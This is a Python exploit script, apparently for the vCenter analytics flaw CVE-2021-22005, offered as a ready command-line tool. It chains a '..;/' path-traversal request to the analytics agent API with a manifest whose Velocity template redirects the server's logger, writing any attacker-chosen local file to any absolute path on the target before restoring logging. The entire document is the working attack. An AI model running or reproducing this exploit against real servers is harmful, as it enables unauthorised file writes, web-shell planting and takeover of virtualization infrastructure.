#!/usr/bin/env python3

import sys
import requests
import urllib3


urllib3.disable_warnings()
req = requests.session()

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

headers = {
    "Cache-Control": "no-cache",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
    "X-Deployment-Secret": "samex",
    "Content-Type": "application/json"
}

def prepare_agent(target):
    try:
        url = f"{target}/analytics/healthstatus/..;/ph/api/dataapp/agent?_c=samex&_i=samey"
        post_json = {
            "collectionTriggerDataNeeded": True,
            "deploymentDataNeeded": True,
            "resultNeeded": True,
            "signalCollectionCompleted": True
        }
        res = req.post(url=url, headers=headers, json=post_json, verify=False)
    except requests.exceptions.RequestException as e:
        print(f"[ReqError]: {e}\n=>{target}")
        return None
    return res.status_code

def do_attack(target, localfile, remotepath):
    url = f"{target}/analytics/healthstatus/..;/ph/api/dataapp/agent?action=collect&_c=samex&_i=samey"
    logpath = "/var/log/vmware/analytics/analytics.log"
    with open(localfile) as filei:
        file_str = filei.read()
    vtl_xml = f"""<manifest recommendedPageSize="500">
        <request>
            <query name="vir:VCenter">
                <constraint>
                    <targetType>ServiceInstance</targetType>
                </constraint>
                <propertySpec>
                    <propertyNames>content.about.instanceUuid</propertyNames>
                    <propertyNames>content.about.osType</propertyNames>
                    <propertyNames>content.about.build</propertyNames>
                    <propertyNames>content.about.version</propertyNames>
                </propertySpec>
            </query>
        </request>
        <cdfMapping>
            <indepedentResultsMapping>
                <resultSetMappings>
                    <entry>
                        <key>vir:VCenter</key>
                        <value>
                            <value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="resultSetMapping">
                                <resourceItemToJsonLdMapping>
                                    <forType>ServiceInstance</forType>
                                    <mappingCode><![CDATA[
                                        $GLOBAL-logger.getLogger().getParent().getAllAppenders().nextElement().setFile("{remotepath}")
                                        $GLOBAL-logger.getLogger().getParent().getAllAppenders().nextElement().activateOptions()
                                        $GLOBAL-logger.getLogger().getParent().getAllAppenders().nextElement().setAppend(false)
                                        $GLOBAL-logger.info('{file_str}')

                                        $GLOBAL-logger.getLogger().getParent().getAllAppenders().nextElement().setFile("{logpath}")
                                        $GLOBAL-logger.getLogger().getParent().getAllAppenders().nextElement().activateOptions()
                                        $GLOBAL-logger.getLogger().getParent().getAllAppenders().nextElement().setAppend(true)

                                        #set($modelKey = $LOCAL-resourceItem.resourceItem.getKey())
                                        #set($objectId = "vim.ServiceInstance:$modelKey.value:$modelKey.serverGuid")
                                        #set($obj = $LOCAL-cdf20Result.newObject("vim.ServiceInstance", $objectId))

                                        $obj.addProperty("OSTYPE", "AnyString")
                                        $obj.addProperty("BUILD", $content-about-build)
                                        $obj.addProperty("VERSION", $content-about-version)
                                    ]]></mappingCode>
                                </resourceItemToJsonLdMapping>
                            </value>
                        </value>
                    </entry>
                </resultSetMappings>
            </indepedentResultsMapping>
        </cdfMapping>
        <requestSchedules>
            <schedule interval="1h">
                <queries>
                    <query>vir:VCenter</query>
                </queries>
            </schedule>
        </requestSchedules>
    </manifest>"""
    post_json = {"contextData": "any", "manifestContent": vtl_xml, "objectId": "any"}
    try:
        res = req.post(url=url, headers=headers, json=post_json, verify=False)
    except requests.exceptions.RequestException as e:
        print(f"[ReqError]: {e}\n=>{target}")
        return None
    return res.status_code

def main(argv):
    server = argv[1]
    localfile = argv[2]
    remotepath = argv[3]
    target = f"https://{server}"

    resa = prepare_agent(target)
    print(f"[*] prepare_agent: {resa}")
    resb = do_attack(target, localfile, remotepath)
    print(f"[*] do_attack: {resb}")


if __name__ == "__main__":
    try:
        main(sys.argv)
    except IndexError:
        print("Usage: python3 22005.py 1.1.1.1 [Local File Path] [Target Absolute Path]")